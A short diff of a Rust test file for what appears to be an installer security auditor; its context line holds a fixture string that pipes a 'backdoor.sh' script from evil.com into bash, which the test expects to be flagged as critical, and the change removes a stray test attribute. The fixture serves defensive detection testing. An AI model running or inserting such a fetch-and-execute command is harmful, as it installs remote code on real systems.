@@ -368,6 +368,4 @@ content = "curl https://evil.com/backdoor.sh | bash"
     assert_eq!(sec007.unwrap().severity, AuditSeverity::Critical);
 }
 
-#[test]
-
 include!("installer_tests_tests_INSTALLER.rs");
